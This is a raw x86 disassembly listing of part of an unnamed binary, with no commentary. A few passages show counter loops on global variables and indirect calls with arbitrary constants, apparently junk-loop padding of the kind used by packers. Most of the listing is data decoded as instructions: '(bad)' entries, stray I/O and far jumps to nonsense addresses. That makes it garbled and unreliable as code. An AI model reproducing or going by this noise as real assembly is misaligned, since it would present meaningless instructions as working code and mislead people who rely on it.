  4051cb:	cmp    ch,0x79
  4051ce:	mov    al,0x25
  4051d0:	test   DWORD PTR [eax-0x1f],ebx
  4051d3:	in     eax,dx
  4051d4:	xchg   edi,eax
  4051d5:	dec    ebx
  4051d6:	fbstp  TBYTE PTR [edi-0x6f]
  4051d9:	add    ebx,DWORD PTR [edx+0x4f]
  4051dc:	sti    
  4051dd:	or     DWORD PTR [eax+0x1a32e4af],edx
  4051e3:	inc    ebp
  4051e4:	cld    
  4051e5:	ror    DWORD PTR [eax],cl
  4051e7:	inc    esp
  4051e8:	jp     0x4051fd
  4051ea:	add    BYTE PTR [ebx-0x49],0x5d
  4051ee:	xchg   ebp,eax
  4051ef:	inc    ebx
  4051f0:	push   ds
  4051f1:	ret    
  4051f2:	dec    edi
  4051f3:	add    BYTE PTR [edi-0x60083c0f],bl
  4051f9:	jno    0x4051c9
  4051fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051fc:	mov    eax,0xbc678ac7
  405201:	leave  
  405202:	pop    esi
  405203:	push   eax
  405204:	xchg   ebx,eax
  405205:	lea    ebp,[esi-0x5925dffa]
  40520b:	mov    ebx,ebp
  40520d:	xchg   ebp,eax
  40520e:	xor    al,0x94
  405210:	jg     0x405283
  405212:	les    esp,FWORD PTR [ecx+0x6a]
  405215:	sub    bl,ch
  405217:	push   edi
  405218:	pusha  
  405219:	mov    DWORD PTR [ebp+0x52cd392c],esp
  40521f:	fcom   QWORD PTR [edi-0x35]
  405222:	and    ch,BYTE PTR [edx+0x22aa18ec]
  405228:	stos   DWORD PTR es:[edi],eax
  405229:	mov    bl,BYTE PTR [ebp+0x72ce7274]
  40522f:	adc    eax,0xb8d622b2
  405234:	loope  0x405230
  405236:	pop    ebp
  405237:	adc    al,BYTE PTR [eax+0x1787715]
  40523d:	xor    BYTE PTR [edi+edi*4-0x3a],0x5
  405242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405243:	shl    ah,cl
  405245:	repz mov edi,DWORD PTR [edi]
  405248:	jnp    0x4052b4
  40524a:	adc    eax,0x36b330ca
  40524f:	les    esi,FWORD PTR [esi+0x4cadbecb]
  405255:	mov    esp,0xfb52745
  40525a:	mov    eax,ds:0x1a21a67b
  40525f:	xchg   edi,eax
  405260:	inc    eax
  405261:	test   eax,0x6fa1aa16
  405266:	idiv   DWORD PTR [edi+ebx*1-0x2f]
  40526a:	sbb    eax,0xf72d1bc0
  40526f:	add    BYTE PTR [eax+0x6],bh
  405272:	mov    ch,0x61
  405274:	jle    0x40526c
  405276:	int    0x6d
  405278:	mov    ah,0xd6
  40527a:	sub    al,BYTE PTR [ecx]
  40527c:	jo     0x405210
  40527e:	sbb    al,0xa1
  405280:	hlt    
  405281:	pop    edx
  405282:	mov    eax,0x26d5ea6c
  405287:	pop    es
  405288:	cdq    
  405289:	(bad)  
  40528a:	(bad)  
  40528c:	es jnp 0x405296
  40528f:	mov    ah,0x70
  405291:	sub    DWORD PTR [ebp-0x7d],0xffffffa2
  405295:	mov    WORD PTR [edx+0x7e35429a],ss
  40529b:	push   eax
  40529c:	cdq    
  40529d:	jle    0x405251
  40529f:	jns    0x405301
  4052a1:	mov    edi,cs
  4052a3:	lods   eax,DWORD PTR ds:[esi]
  4052a4:	sahf   
  4052a5:	sbb    al,0xf
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4304a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4304a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4304a6,eax
  405305:	cmp    DWORD PTR ds:0x4304a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4304a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eaa8
  40533f:	cmp    DWORD PTR ds:0x4304a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4304a6
  405351:	inc    eax
  405352:	mov    ds:0x4304a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4304da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43056a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4304c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4304b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4304a6
  40538a:	add    DWORD PTR ds:0x42e772,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4304be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4304be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4304be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4304be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eba0
  4053c9:	cmp    DWORD PTR ds:0x4304be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42e9e4
  405405:	cmp    DWORD PTR ds:0x42ee14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0xe3b64b09
  405456:	fcmovbe st,st(2)
  405458:	and    al,0x7e
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x4053fb
  405460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405461:	push   0xd2770bd6
  405466:	push   eax
  405467:	test   DWORD PTR [ecx-0x3c],esi
  40546a:	sub    eax,0x612bb66c
  40546f:	inc    edi
  405470:	leave  
  405471:	push   esp
  405472:	xor    bl,BYTE PTR [ecx+ecx*1+0x61d6eb44]
  405479:	push   edx
  40547a:	fstp   st(5)
  40547c:	mov    cl,0x53
  40547e:	or     BYTE PTR [edi+0x7e457d6d],ah
  405484:	mov    esi,0x532b1ff6
  405489:	pop    edi
  40548a:	data16 jmp 0x40541e
  40548d:	and    eax,0x27a8779f
  405492:	and    ebp,DWORD PTR [edi-0x31bbce98]
  405498:	mov    al,0x41
  40549a:	inc    edi
  40549b:	or     eax,0x541b4e23
  4054a0:	mov    DWORD PTR [ecx],esi
  4054a2:	aad    0x62
  4054a4:	imul   edx,DWORD PTR [eax+0x30aac572],0x61
  4054ab:	test   eax,0x183168ef
  4054b0:	or     dh,al
  4054b2:	xchg   ecx,eax
  4054b3:	stos   DWORD PTR es:[edi],eax
  4054b4:	in     al,0xf2
  4054b6:	lods   al,BYTE PTR ds:[esi]
  4054b7:	in     eax,dx
  4054b8:	lock cmp eax,0xe7046cc5
  4054be:	jne    0x4054f1
  4054c0:	mov    esi,DWORD PTR ds:[eax]
  4054c3:	loopne 0x405463
  4054c5:	retf   0xd0e5
  4054c8:	(bad)  
  4054c9:	push   eax
  4054ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054cb:	push   es
  4054cc:	test   BYTE PTR [eax],cl
  4054ce:	xchg   edi,eax
  4054cf:	fwait
  4054d0:	xor    cl,BYTE PTR [ebp+edi*2-0x65]
  4054d4:	fbstp  TBYTE PTR [eax+0x185e0c79]
  4054da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054db:	push   esi
  4054dc:	cmp    al,0x7c
  4054de:	das    
  4054df:	xchg   edx,eax
  4054e0:	or     al,0x10
  4054e2:	mov    edi,0xc48ca72d
  4054e7:	xor    eax,0x57b8f52f
  4054ec:	ins    BYTE PTR es:[edi],dx
  4054ed:	(bad)  
  4054ee:	call   0xd7d4a9b4
  4054f3:	jb     0x405555
  4054f5:	mov    DWORD PTR [ebx],ebp
  4054f7:	mov    dl,0x43
  4054f9:	sbb    al,0x4d
  4054fb:	mov    ds:0xacd53ae9,eax
  405500:	paddusb mm1,QWORD PTR [esi+0xfa6524]
  405507:	shr    ebx,1
  405509:	repz std 
  40550b:	xchg   DWORD PTR [esi-0xf21f420],ebx
  405511:	and    DWORD PTR [edx+eax*4+0x6d],eax
  405515:	cmp    dl,ah
  405517:	jmp    0x4054c0
  405519:	rcl    ch,0xdd
  40551c:	jae    0x40557d
  40551e:	mov    esp,0xa00445d6
  405523:	mov    ecx,0xfb91564f
  405528:	ds iret 
  40552a:	jbe    0x405502
  40552c:	jmp    0x4351:0xfe80f1c0
  405533:	adc    eax,0x4349ab16
  405538:	ret    
  405539:	jecxz  0x405527
  40553b:	into   
  40553c:	mov    ebx,0x4bdc296d
  405541:	fs bnd jp 0x4054e5
  405545:	add    eax,0xf9c2107e
  40554a:	sub    DWORD PTR [ebx+eax*8-0x4c],esp
  40554e:	out    0x35,al
  405550:	iret   
  405551:	cmp    eax,0x9319b032
  405556:	out    dx,eax
  405557:	or     eax,eax
  405559:	into   
  40555a:	loope  0x40559b
  40555c:	les    esi,FWORD PTR [eax]
  40555e:	or     DWORD PTR gs:[ecx],esi
  405561:	inc    esi
  405563:	mov    al,0x51
  405565:	sar    BYTE PTR [ecx+0x8e1dc47],cl
  40556b:	push   edi
  40556c:	fcomi  st,st(1)
  40556e:	jge    0x405575
  405570:	cmp    BYTE PTR [edi+0x75],bh
  405573:	cdq    
  405574:	aad    0x81
  405576:	cld    
  405577:	cmp    eax,0x3c958b34
  40557c:	jge    0x40552f
  40557e:	out    0xd3,eax
  405580:	fisttp WORD PTR [eax+0x5172003e]
  405586:	fistp  WORD PTR [ecx+0x4a]
  405589:	adc    edx,DWORD PTR [esi-0x3ce620ec]
  40558f:	dec    ebx
  405590:	shl    ecx,cl
  405592:	outs   dx,DWORD PTR ds:[esi]
  405593:	ins    BYTE PTR es:[edi],dx
  405594:	mov    cl,0x14
  405596:	ins    DWORD PTR es:[edi],dx
  405597:	xchg   bl,dh
  405599:	jmp    0xe3f9:0xfaba8581
  4055a0:	in     eax,0xe2
  4055a2:	fmul   DWORD PTR [eax]
  4055a4:	mov    edi,0xcd53ef96
  4055a9:	xor    eax,ebp
  4055ab:	test   eax,0xfe2b0091
  4055b0:	outs   dx,DWORD PTR ds:[esi]
  4055b1:	xor    BYTE PTR [ebp+ebx*1-0x4aad63a6],bl
  4055b8:	call   0xc76c:0x662943ff
  4055bf:	mov    ch,0xb3
  4055c1:	call   0x8e16:0x812cdc3f
  4055c8:	dec    esp
  4055c9:	in     eax,0x31
  4055cb:	(bad)  
  4055cc:	cdq    
  4055cd:	mov    ah,0x45
  4055cf:	(bad)  
  4055d0:	les    eax,FWORD PTR [eax]
  4055d2:	mov    cl,0xe8
  4055d4:	adc    dl,BYTE PTR [eax-0x5a]
  4055d7:	jb     0x405564
  4055d9:	and    dh,BYTE PTR [edi]
  4055db:	aad    0x69
  4055dd:	loop   0x405635
  4055df:	cmp    BYTE PTR [edi-0x7ad9a589],ch
  4055e5:	imul   ebp,eax,0xffffffdd
  4055e8:	cs pop ss
  4055ea:	push   ebp
  4055eb:	pop    DWORD PTR [edi+0xa6c448c]
  4055f1:	out    dx,eax
  4055f2:	adc    dl,ch
  4055f4:	pop    ss
  4055f5:	mov    ecx,0x343f3c8b
  4055fa:	mov    esi,0xf8d18c29
  4055ff:	jl     0x40563f
  405601:	lods   eax,DWORD PTR ds:[esi]
  405602:	or     DWORD PTR [esp+eiz*2],ecx
  405605:	dec    ebp
  405606:	fmul   st,st(4)
  405608:	add    dl,ah
  40560a:	scas   eax,DWORD PTR es:[edi]
  40560b:	cli    
  40560c:	retf   
  40560d:	jo     0x405686
  40560f:	pop    ebx
  405610:	mov    esp,0x3d4a9393
  405615:	xchg   esp,eax
  405616:	(bad)  
  405617:	jns    0x4055e6
  405619:	stc    
  40561a:	and    al,0xf4
  40561c:	imul   ecx,DWORD PTR [ecx],0x38286258
  405622:	pop    edi
  405623:	sbb    al,0x66
  405625:	add    ebx,DWORD PTR [ecx]
  405627:	pop    ebx
  405628:	lods   al,BYTE PTR ds:[esi]
  405629:	outs   dx,DWORD PTR ds:[esi]
  40562a:	(bad)
  40562d:	retf   
  40562e:	sub    ebx,DWORD PTR [ecx+0x4b]
  405631:	das    
  405632:	cwde   
  405633:	dec    edx
  405634:	imul   ebx,DWORD PTR [esi+0x33],0x1a
  405638:	pop    esp
  405639:	jnp    0x4055f3
  40563b:	mov    BYTE PTR [ecx+0x6cc6ee49],dl
  405641:	jbe    0x4056c2
  405643:	hlt    
  405644:	mov    BYTE PTR [eax+0x25699794],0x71
  40564b:	ja     0x40567b
  40564d:	scas   eax,DWORD PTR es:[edi]
  40564e:	or     edi,eax
  405650:	out    0x40,eax
  405652:	(bad)  
  405653:	jns    0x405629
  405655:	and    ch,bl
  405657:	hlt    
  405658:	pushf  
  405659:	scas   eax,DWORD PTR es:[edi]
  40565a:	fcmovne st,st(3)
  40565c:	out    0xc5,eax
  40565e:	test   DWORD PTR [esi+0x45],0x4c03293
  405665:	adc    esi,DWORD PTR ds:0xda313aac
  40566b:	cmp    esi,eax
  40566d:	dec    ecx
  40566e:	jne    0x4056a1
  405670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405671:	ja     0x40562a
  405673:	les    edi,FWORD PTR [edx+eiz*4]
  405676:	push   cs
  405677:	pop    eax
  405678:	cmp    ah,BYTE PTR [ebx]
  40567a:	aaa    
  40567b:	shl    DWORD PTR [esi-0x62],0x69
  40567f:	cmp    BYTE PTR [edi+esi*4],ah
  405682:	inc    ebx
  405683:	mov    DWORD PTR [ebx],ebx
  405685:	cdq    
  405686:	jbe    0x405633
  405688:	out    0x1f,eax
  40568a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40568b:	mov    edx,0x497f355b
  405690:	sub    bl,ch
  405692:	push   ebp
  405693:	test   DWORD PTR [edx],ebp
  405695:	cmp    ecx,DWORD PTR [edx+0x7462d21f]
  40569b:	or     ebx,DWORD PTR [esi-0x23]
  40569e:	push   ecx
  40569f:	ret    0x993d
  4056a2:	fdiv   st,st(0)
  4056a4:	sub    DWORD PTR [edi-0x63],ebp
  4056a7:	ret    0xaa29
  4056aa:	popa   
  4056ab:	xor    eax,0xca2ecdda
  4056b0:	inc    eax
  4056b1:	inc    esp
  4056b2:	jecxz  0x405725
  4056b4:	sub    esi,eax
  4056b6:	push   edx
  4056b7:	sub    DWORD PTR ds:0xabc5a925,esp
  4056bd:	ret    0xf4c9
  4056c0:	out    dx,eax
  4056c1:	stos   BYTE PTR es:[edi],al
  4056c2:	mov    ds:0xf945fc4f,eax
  4056c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c8:	dec    esp
  4056c9:	mov    al,ds:0xbf5aecc0
  4056ce:	aaa    
  4056cf:	leave  
  4056d0:	test   BYTE PTR [esi+esi*8+0x72],0x5f
  4056d5:	nop
  4056d6:	imul   edx,DWORD PTR [ebx-0x45186e8e],0x5434d9e9
  4056e0:	mov    ebp,0x1860f44
  4056e5:	mov    edi,0x6a8cc703
  4056ea:	clc    
  4056eb:	push   esi
  4056ec:	xchg   edx,eax
  4056ed:	les    edi,FWORD PTR [ebp-0x4a]
  4056f0:	ja     0x405694
  4056f2:	mov    esp,0x75d1a5e0
  4056f7:	lods   eax,DWORD PTR ds:[esi]
  4056f8:	xchg   edx,eax
  4056f9:	mov    al,ds:0x177d5c16
  4056fe:	sbb    ch,BYTE PTR [eax+0xfe9e9f0]
  405704:	mov    al,0x9d
  405706:	cmp    eax,0xc27c0d77
  40570b:	mov    esi,0x627229
  405710:	lds    ebx,FWORD PTR [edi+0x5]
  405713:	push   ebx
  405714:	repz xchg edi,eax
  405716:	into   
  405717:	mov    BYTE PTR [esi],ah
  405719:	add    ch,0x53
  40571c:	xor    DWORD PTR [ebx+0x5b],esp
  40571f:	test   esp,0x3d5484d
  405725:	cs cmp al,0x47
  405728:	adc    al,0xb9
  40572a:	fsub   QWORD PTR [ebp+ecx*4-0x3e]
  40572e:	mov    eax,0x3cdd42e
  405733:	cli    
  405734:	dec    edi
  405735:	pop    ecx
  405736:	(bad)  
  405737:	dec    ebx
  405738:	add    al,BYTE PTR [ecx]
  40573a:	out    dx,al
  40573b:	test   eax,0x3e3c901f
  405740:	xor    bh,bh
  405742:	mov    eax,ds:0xa7e7c985
  405747:	inc    esp
  405748:	mov    edi,0x54fb8a0a
  40574d:	or     DWORD PTR [edx+ebp*4+0x45],eax
  405751:	int    0x94
  405753:	pop    esp
  405754:	and    al,0x96
  405756:	pop    ecx
  405757:	shl    DWORD PTR [ebx+edx*8-0x288ee475],1
  40575e:	repz mov edi,0xd50d6bc0
  405764:	sub    al,BYTE PTR [edx-0x17]
  405767:	fnstsw WORD PTR [edi]
  405769:	mov    eax,0x77a9aa4c
  40576e:	aad    0x8a
  405770:	push   ecx
  405771:	mov    edi,0xdf5bd313
  405776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405777:	sub    al,0x22
  405779:	push   es
  40577a:	xor    al,0x1a
  40577c:	xchg   BYTE PTR [bx+di],al
  40577f:	inc    eax
  405780:	and    BYTE PTR [ecx+0x56],dl
  405783:	loop   0x405712
  405785:	mov    gs,WORD PTR [esp+ebx*8-0x42]
  405789:	rcr    DWORD PTR [ebp-0x6dc77b97],1
  40578f:	ins    DWORD PTR es:[edi],dx
  405790:	mov    dl,0xdb
  405792:	mov    bl,0x6c
  405794:	imul   ecx,DWORD PTR [eax-0x3a9707f2],0x76
  40579b:	outs   dx,BYTE PTR ds:[esi]
  40579c:	jg     0x40576d
  40579e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579f:	adc    BYTE PTR [esi+0x4f95674b],dh
  4057a5:	jmp    0x547382f0
  4057aa:	fwait
  4057ab:	and    DWORD PTR [esi-0x12f98321],ebx
  4057b1:	or     eax,edx
  4057b3:	and    dh,ah
  4057b5:	mov    eax,0x6c6b0182
  4057ba:	mov    ecx,0x7345e4a1
  4057bf:	add    edi,esp
  4057c1:	dec    edx
  4057c2:	push   cs
  4057c3:	xor    DWORD PTR [eax],ebp
  4057c5:	inc    edx
  4057c6:	outs   dx,DWORD PTR ds:[esi]
  4057c7:	dec    eax
  4057c8:	pop    esi
  4057c9:	mov    bh,0xae
  4057cb:	retf   0x4c28
  4057ce:	and    esp,DWORD PTR [ebx]
  4057d0:	push   ecx
  4057d1:	xchg   DWORD PTR [ecx],esp
  4057d3:	push   ebp
  4057d4:	mov    dl,0xda
  4057d6:	xor    eax,0x5589519f
  4057db:	out    0x8,eax
  4057dd:	pop    ecx
  4057de:	inc    edx
  4057df:	mov    al,ds:0x4cfc1cee
  4057e4:	xor    bh,dl
  4057e6:	xor    ebp,ebp
  4057e8:	mov    eax,0x389444af
  4057ed:	sahf   
  4057ee:	rcl    BYTE PTR [edx-0x24],0x24
  4057f2:	push   esp
  4057f3:	jmp    0xc727:0x349cc61f
  4057fa:	(bad)  
  4057fb:	loop   0x405876
  4057fd:	std    
  4057fe:	popf   
  4057ff:	jmp    0x4057be
  405801:	hlt    
  405802:	inc    edi
  405803:	sahf   
  405804:	push   ebp
  405805:	pop    esp
  405806:	pushf  
  405807:	imul   ebx,esp,0x7a19e32e
  40580d:	int    0x40
  40580f:	inc    edi
  405810:	aad    0xb5
  405812:	into   
  405813:	bound  eax,QWORD PTR [edx]
  405815:	adc    BYTE PTR [esi+0x24],dl
  405818:	pop    edx
  405819:	mov    BYTE PTR [edi+0x3b885e36],cl
  40581f:	cli    
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x2391b8c4],bh
  405847:	rcl    BYTE PTR [ecx],1
  405849:	cmp    BYTE PTR [esi+0x7e],bh
  40584c:	mov    ebp,0xd47e7e71
  405851:	sub    al,0x6d
  405853:	add    DWORD PTR [ebx],edx
  405855:	sub    BYTE PTR [ecx],bl
  405857:	loop   0x405880
  405859:	shr    BYTE PTR [ecx],0x3e
  40585c:	add    BYTE PTR [esi-0x57],bh
  40585f:	or     al,0x23
  405861:	pop    eax
  405862:	push   ebx
  405863:	mov    bh,0x85
  405865:	(bad)  
  405866:	fisub  WORD PTR [eax-0x7]
  405869:	loopne 0x40587c
  40586b:	push   ebp
  40586c:	sahf   
  40586d:	jl     0x405812
  40586f:	into   
  405870:	pop    eax
  405871:	add    ch,BYTE PTR [ecx-0x3ecffa5e]
  405877:	and    al,0xf1
  405879:	cmp    BYTE PTR [esi+esi*1+0x5e],bl
  40587d:	cmp    BYTE PTR [ecx+0x2fb3f01],al
  405883:	jg     0x40587b
  405885:	or     esi,edi
  405887:	repnz aaa 
  405889:	lea    ebx,[ebx+0x23]
  40588c:	shl    DWORD PTR [ebx+0x22818918],1
  405892:	or     dh,dh
  405894:	jne    0x4058ee
  405896:	icebp  
  405897:	xor    DWORD PTR [ebx-0x5d],eax
  40589a:	jge    0x4058ce
  40589c:	inc    ecx
  40589d:	or     DWORD PTR [ebx],edx
  40589f:	xor    al,0xbe
  4058a1:	push   ebx
  4058a2:	rcl    ecx,1
  4058a4:	(bad)  
  4058a5:	adc    al,0xa1
  4058a7:	cwde   
  4058a8:	sbb    BYTE PTR [edx-0x3412f43e],dl
  4058ae:	daa    
  4058af:	add    ebp,DWORD PTR [edx-0x81aee90]
  4058b5:	imul   edx,eax,0xecc1437
  4058bb:	inc    esi
  4058bc:	push   ebp
  4058bd:	jno    0x4058d0
  4058bf:	jmp    ebx
  4058c1:	jg     0x4058bb
  4058c3:	xchg   BYTE PTR [esi+0x45356573],cl
  4058c9:	adc    BYTE PTR [edi],bl
  4058cb:	push   ss
  4058cc:	clc    
  4058cd:	cmp    edx,edx
  4058cf:	push   0x7b
  4058d1:	rcr    DWORD PTR [ebp+esi*1-0x561a21cb],1
  4058d8:	inc    ebx
  4058d9:	das    
  4058da:	cwde   
  4058db:	js     0x4058de
  4058dd:	or     al,BYTE PTR [eax+0x50]
  4058e0:	rcl    ebp,1
  4058e2:	and    BYTE PTR [edx-0x51eb62d],al
  4058e8:	fdivr  st,st(7)
  4058ea:	int    0xa1
  4058ec:	call   FWORD PTR [ebx+eax*2-0xee4f166]
  4058f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f4:	sbb    eax,0xa19087ff
  4058f9:	mov    bh,0x87
  4058fb:	inc    esp
  4058fc:	repnz out 0xde,eax
  4058ff:	mov    WORD PTR ds:0xf3cc7b1f,fs
  405905:	inc    esp
  405906:	mov    ch,0x30
  405908:	adc    BYTE PTR [ecx-0x54],cl
  40590b:	(bad)  
  40590c:	jg     0x405943
  40590e:	hlt    
  40590f:	mov    eax,ds:0x906a77a0
  405914:	nop
  405915:	lea    esp,[edi+ebx*2]
  405918:	mov    ebp,0x20b266c1
  40591d:	jb     0x405941
  40591f:	stos   DWORD PTR es:[edi],eax
  405920:	imul   DWORD PTR [ecx+0x3582bad3]
  405926:	shl    BYTE PTR [ecx-0x6],1
  405929:	add    esp,DWORD PTR [eax]
  40592b:	ins    BYTE PTR es:[edi],dx
  40592c:	cli    
  40592d:	add    ah,BYTE PTR [ebx]
  40592f:	mov    esp,0x1ec5a78e
  405934:	add    al,0x75
  405936:	mov    ds:0xf55dd6c5,al
  40593b:	ins    DWORD PTR es:[edi],dx
  40593c:	push   ecx
  40593d:	cmp    BYTE PTR [edx+eax*8],0xf8
  405941:	ror    DWORD PTR [ebx-0x1d46963c],1
  405947:	pop    ds
  405948:	push   ebx
  405949:	inc    edi
  40594a:	int3   
  40594b:	leave  
  40594c:	std    
  40594d:	dec    edx
  40594e:	dec    ecx
  40594f:	dec    esi
  405950:	not    BYTE PTR ds:0x7a291b30
  405956:	lds    edi,FWORD PTR [edi+0x1c]
  405959:	pushf  
  40595a:	mov    WORD PTR [ebp-0x3b],?
  40595d:	cdq    
  40595e:	pop    eax
  40595f:	add    al,0x52
  405961:	xchg   bl,ch
  405963:	push   ecx
  405964:	xor    BYTE PTR [edi+0x7d],0xff
  405968:	ss xchg ecx,eax
  40596a:	loop   0x4059d5
  40596c:	sbb    DWORD PTR ds:0xebb99af3,eax
  405972:	xchg   esi,eax
  405973:	imul   ebp,DWORD PTR [edx+0x22704f9],0x11
  40597a:	mov    dh,0x2
  40597c:	cld    
  40597d:	repnz adc esp,esp
  405980:	xor    al,0xd4
  405982:	dec    esi
  405983:	fsub   QWORD PTR [eax-0x46]
  405986:	iret   
  405987:	jge    0x405909
  405989:	add    al,0xf5
  40598b:	std    
  40598c:	inc    edx
  40598d:	into   
  40598e:	and    ecx,ebx
  405990:	mov    edx,0x908e9262
  405995:	or     ax,0xb3c9
  405999:	xchg   ebx,eax
  40599a:	fwait
  40599b:	sbb    al,ah
  40599d:	lea    ebp,[edx+0x45fb033e]
  4059a3:	les    edi,FWORD PTR [ecx+0x4f47519]
  4059a9:	shr    BYTE PTR [edx+0xd],cl
  4059ac:	das    
  4059ad:	dec    esp
  4059ae:	jns    0x40596c
  4059b0:	mov    dl,0xb7
  4059b2:	sbb    al,0x27
  4059b4:	fxch   st(3)
  4059b6:	les    eax,FWORD PTR [ecx]
  4059b8:	jns    0x4059d0
  4059ba:	cmp    DWORD PTR ds:0x8e11425,ecx
  4059c0:	adc    esp,DWORD PTR ds:0x76c17b0f
  4059c6:	and    DWORD PTR [edx+0x38],0x28
  4059ca:	xlat   BYTE PTR ds:[ebx]
  4059cb:	xor    al,al
  4059cd:	dec    edx
  4059ce:	add    BYTE PTR [ecx+0x1e1cddc4],cl
  4059d4:	(bad)  [ecx]
  4059d6:	into   
  4059d7:	mov    ah,al
  4059d9:	hlt    
  4059da:	ret    
  4059db:	jecxz  0x4059a7
  4059dd:	or     al,0x65
  4059df:	pop    ds
  4059e0:	out    0x53,al
  4059e2:	dec    ebp
  4059e3:	jmp    DWORD PTR [ebx+0x3de1860c]
  4059e9:	inc    ebx
  4059ea:	sub    eax,0x2113f8c6
  4059ef:	aaa    
  4059f0:	test   al,0xc6
  4059f2:	jo     0x4059ea
  4059f4:	sub    ecx,DWORD PTR [ecx-0x6f4565a]
  4059fa:	inc    ebx
  4059fb:	sbb    al,0x3f
  4059fd:	xchg   esi,eax
  4059fe:	popf   
  4059ff:	loop   0x405a28
  405a01:	scas   al,BYTE PTR es:[edi]
  405a02:	int3   
  405a03:	(bad)  
  405a04:	test   DWORD PTR [eax],esi
  405a06:	hlt    
  405a07:	dec    ebp
  405a08:	cmp    DWORD PTR [edx+0x7144e6e0],esi
  405a0e:	fadd   QWORD PTR [ebp+edx*4+0x72]
  405a12:	ficom  DWORD PTR [edi]
  405a14:	xor    DWORD PTR [ebx-0x120d60b8],0xffffffa9
  405a1b:	cmc    
  405a1c:	stc    
  405a1d:	adc    eax,0xcda5aea1
  405a22:	inc    esi
  405a23:	(bad)  
  405a24:	cmp    DWORD PTR [esi+0x3d],edi
  405a27:	xchg   esi,eax
  405a28:	out    0xf9,al
  405a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a2b:	pop    ebp
  405a2c:	jg     0x405a65
